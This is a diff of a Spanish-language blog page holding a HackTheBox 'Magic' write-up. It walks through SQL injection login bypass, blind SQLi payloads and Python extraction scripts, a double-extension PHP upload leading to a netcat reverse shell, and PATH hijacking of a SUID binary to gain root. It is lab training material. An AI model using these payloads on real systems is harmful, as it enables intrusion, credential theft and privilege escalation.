@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -14,23 +14,23 @@
 
 <meta name="author" content="CeleroRKX">
 <meta name="description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Magic Machine - HackTheBox">
-  <meta name="twitter:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Magic Machine - HackTheBox">
+	<meta name="twitter:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
 
 <meta property="og:url" content="https://celero0.github.io/posts/magic/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="Magic Machine - HackTheBox">
-  <meta property="og:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-01-31T01:35:22+00:00">
-    <meta property="article:modified_time" content="2026-01-31T01:35:22+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="Magic Machine - HackTheBox">
+	<meta property="og:description" content="Esta es una máquina de nivel medio de la plataforma HackThebox, en la cual se tocan varias vulnerabilidades, como SQLi, file upload y PathHijacking">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-01-31T01:35:22+00:00">
+		<meta property="article:modified_time" content="2026-01-31T01:35:22+00:00">
 
 
 
@@ -45,7 +45,7 @@
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -55,13 +55,19 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -90,7 +96,7 @@
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -117,6 +123,14 @@
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -148,12 +162,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2026-01-31T01:35:22Z">
-                January 31, 2026
+                31 de enero de 2026
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              8-minute read
+              8 minutos de lectura.
             </span>
           </div>
           
@@ -189,7 +203,7 @@
   </a>
 </h1>
 <p>Realizamos un escaneo de los puertos, encontrando como resultado el puerto <code>80</code> abierto, que está corriendo el servicio <code>HTTP</code>, y el puerto <code>22</code> corriendo <code>SSH</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.11.233 -oG allPorts
 </span></span></code></pre></div><img src="/images/Pasted image 20260129185051.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>En cuenta a las versiones de estos servicios, tenemos las siguiente</p>
 <img src="/images/Pasted image 20260129185134.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -215,13 +229,13 @@
   </a>
 </h1>
 <p>Interceptamos la petición con <code>Burpsuite</code>, y ahora probamos el siguiente payload para bypassear la página de <code>login</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>1<span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>1<span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>Enviándolo, vemos que nos redirige hacia <code>upload.php</code></p>
 <img src="/images/Pasted image 20260130001155.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto la web es vulnerable a SQLi, probaremos con una igualdad errónea, para ver si nos muestra un mensaje diferente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>2<span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or &#39;</span>1<span style="color:#a5d6ff">&#39;=&#39;</span>2<span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>y vemos que aparece nuevamente el error de <code>Javascript</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;</span>script<span style="color:#ff7b72;font-weight:bold">&gt;</span>alert(<span style="color:#a5d6ff">&#39;Wrong Username or Password&#39;</span>)<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#f85149">/script&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;</span>script<span style="color:#ff7b72;font-weight:bold">&gt;</span>alert(<span style="color:#a5d6ff">&#39;Wrong Username or Password&#39;</span>)<span style="color:#ff7b72;font-weight:bold">&lt;</span><span style="color:#f85149">/script&gt;</span>
 </span></span></code></pre></div><img src="/images/Pasted image 20260130001457.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto tenemos una vía para enumerar la base de datos</p>
 <h2 id="obteniendo-nombre-de-la-bases-de-datos">
@@ -233,12 +247,12 @@
 </h2>
 <p>Para obtener el nombre de la base de datos, tenemos el siguiente payload</p>
 <p><strong>Nota:</strong> Utilizamos <code>BINARY</code>, para hacer que la petición sea case-sensitive.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>a<span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>a<span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>Vemos que nos aparece el mensaje de error, por tanto sabemos que el primer carácter del nombre de la base de datos no es <code>a</code></p>
 <p>Si mandamos el siguiente payload, vemos que desaparece el mensaje de error, por tanto el primer carácter es una <code>M</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>M<span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#79c0ff">username</span><span style="color:#ff7b72;font-weight:bold">=</span>test&amp;<span style="color:#79c0ff">password</span><span style="color:#ff7b72;font-weight:bold">=</span>test<span style="color:#a5d6ff">&#39; or substring(BINARY database(),1,1)=&#39;</span>M<span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>Para poder encontrar todos los valores del nombre de la base de datos, tenemos el siguiente script en Python</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
 </span></span><span style="display:flex;"><span>
@@ -271,9 +285,9 @@
   </a>
 </h2>
 <p>El payload para encontrar las tablas de la base de datos <code>Magic</code> es el siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(table_name) from information_schema.tables where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(table_name) from information_schema.tables where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>Por tanto, podemos crear un script en Python, para que nos devuelva todos los nombres de las tablas</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
 </span></span><span style="display:flex;"><span>
@@ -306,9 +320,9 @@
   </a>
 </h2>
 <p>Para obtener las columnas de la tabla <code>login</code>, tenemos el siguiente payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(column_name) from information_schema.columns where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39; and table_name=&#39;</span>login<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>test<span style="color:#a5d6ff">&#39; or substring((select group_concat(column_name) from information_schema.columns where table_schema=&#39;</span>Magic<span style="color:#a5d6ff">&#39; and table_name=&#39;</span>login<span style="color:#a5d6ff">&#39;),{pos},1)=&#39;</span><span style="color:#ff7b72;font-weight:bold">{</span>char<span style="color:#ff7b72;font-weight:bold">}</span><span style="color:#f85149">&#39;</span>--+-
 </span></span></code></pre></div><p>Para obtener todas las columnas, podemos utilizar el siguiente script</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">string</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff7b72">import</span> <span style="color:#ff7b72">os</span>
 </span></span><span style="display:flex;"><span>
@@ -341,7 +355,7 @@
   </a>
 </h2>
 <p>Para obtener los datos de la columna <code>username</code>, y la columna <code>password</code>. Podemos utilizar el siguiente payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>import requests
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>import requests
 </span></span><span style="display:flex;"><span>import string
 </span></span><span style="display:flex;"><span>import os
 </span></span><span style="display:flex;"><span>import sys
@@ -388,11 +402,11 @@
 <p>Probando con una imagen cualquier <code>.jpeg</code>, vemos que dice que se ha subido exitosamente, pero no sabemos a qué directorio se sube</p>
 <img src="/images/Pasted image 20260130005608.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto vamos a realizar un fuzzeo, para encontrar el directorio que alberga las imágenes que subimos, para ello usaremos <code>FUFF</code>, de la siguiente manera</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fl <span style="color:#a5d6ff">60</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fl <span style="color:#a5d6ff">60</span>
 </span></span></code></pre></div><p>y encontramos dos directorios <code>images</code>, y <code>assets</code></p>
 <img src="/images/Pasted image 20260130005708.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si realizamos otro fuzzeo en el directorio <code>/images</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs <span style="color:#a5d6ff">276</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs <span style="color:#a5d6ff">276</span>
 </span></span></code></pre></div><p>Encontramos el directorio <code>uploads</code></p>
 <img src="/images/Pasted image 20260130005929.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si vamos al directorio <code>/images/uploads/image.jpeg</code>, que es el foto que subimos previamente, encontramos que ahí se encuentra</p>
@@ -407,7 +421,7 @@
 <img src="/images/Pasted image 20260130010429.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Probaremos usar doble extensión, e insertaremos código <code>PHP</code> al final del todo, para verificar si se interpreta.</p>
 <p>para ello utilizaremos el siguiente código</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;?</span>php <span style="color:#ff7b72">if</span>(<span style="color:#a5d6ff">5</span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#a5d6ff">3</span>) <span style="color:#ff7b72">echo</span> <span style="color:#a5d6ff">&#34;Vulnerable&#34;</span>; <span style="color:#8b949e;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#f85149">
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;?</span>php <span style="color:#ff7b72">if</span>(<span style="color:#a5d6ff">5</span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#a5d6ff">3</span>) <span style="color:#ff7b72">echo</span> <span style="color:#a5d6ff">&#34;Vulnerable&#34;</span>; <span style="color:#8b949e;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#f85149">
 </span></span></span></code></pre></div><p>y en <code>filename</code>, pondremos <code>test.php.jpg</code></p>
 <p>de la siguiente forma</p>
 <img src="/images/Pasted image 20260130010728.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -416,7 +430,7 @@
 <p>y ahora vamos hacia <code>/images/uploads/test.php.jpg</code> y vemos que el código <code>PHP</code> fue interpretado, por tanto tenemos ejecución de código</p>
 <img src="/images/Pasted image 20260130010820.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora podemos subir un archivo malicioso, que nos envíe una consola interactiva hacia un puerto en el que estaremos en escucha con <code>nc</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#a5d6ff">4443</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#a5d6ff">4443</span>
 </span></span></code></pre></div><p>y ejecutaremos el código de <code>Pentestmonkey</code> <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php"  class="external-link" target="_blank" rel="noopener">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php</a></p>
 <p>Subimos el archivo <code>shell.php.jgp</code>, y ahora lo ejecutamos</p>
 <img src="/images/Pasted image 20260130011120.png" style="width:100%; height:auto; display:block; margin:auto;">
@@ -439,13 +453,13 @@
 <img src="/images/Pasted image 20260130011556.png" style="width:100%; height:auto; display:block; margin:auto;">
 # Escalando privilegios
 <p>Para escalar privilegios buscamos por archivos con permisos SUID</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
 </span></span></code></pre></div><p>y encontramos el binario <code>sysinfo</code>, que no es usual</p>
 <img src="/images/Pasted image 20260130011831.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Al correrlo nos muestra mucho output, pero no da opción a nada</p>
 <img src="/images/Pasted image 20260130011926.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Le hacemos un <code>strings</code>, para ver los caracteres legibles, en búsqueda de comprender mejor el binario</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /bin/sysinfo
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /bin/sysinfo
 </span></span></code></pre></div><h2 id="explotando-pathhijacking">
   Explotando PathHijacking
   <a class="heading-link" href="#explotando-pathhijacking">
@@ -457,19 +471,19 @@
 <img src="/images/Pasted image 20260130012043.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Vemos que utiliza <code>lshw</code>, <code>fdisk</code> y <code>cat</code>, sin proporcionar la ruta absoluta, por tanto es vulnerable a #PathHijacking</p>
 <p>Nos dirigiremos al directorio <code>/tmp</code>, y ahí crearemos el archivo <code>lshw</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch lshw
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch lshw
 </span></span></code></pre></div><p>y posteriormente agregaremos el contenido para cambiar <code>/bin/bash</code> a suid</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;chmod u+s /bin/bash&#34;</span> &gt;&gt; /tmp/lshw
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;chmod u+s /bin/bash&#34;</span> &gt;&gt; /tmp/lshw
 </span></span></code></pre></div><img src="/images/Pasted image 20260130012615.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Le damos permisos de ejecución para todos los usuarios</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x /tmp/lshw
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x /tmp/lshw
 </span></span></code></pre></div><p>y cambiamos el <code>PATH</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export <span style="color:#79c0ff">PATH</span><span style="color:#ff7b72;font-weight:bold">=</span>/tmp:<span style="color:#79c0ff">$PATH</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export <span style="color:#79c0ff">PATH</span><span style="color:#ff7b72;font-weight:bold">=</span>/tmp:<span style="color:#79c0ff">$PATH</span>
 </span></span></code></pre></div><p>Ahora volvemos a correr el binario <code>/bin/sysinfo</code></p>
 <p>y si vemos si ha cambiado <code>/bin/bash</code>, tenemos que ahora es <code>SUID</code></p>
 <img src="/images/Pasted image 20260130013110.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto ahora podemos hacer el siguiente comando para tener privilegios de <code>root</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
 </span></span></code></pre></div><p>y tenemos privilegios máximos en el sistema, permitiéndonos poder leer la <code>root.txt</code> y comprometer totalmente la máquina víctima.</p>
 <img src="/images/Pasted image 20260130013215.png" style="width:100%; height:auto; display:block; margin:auto;">
 
@@ -499,13 +513,13 @@
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
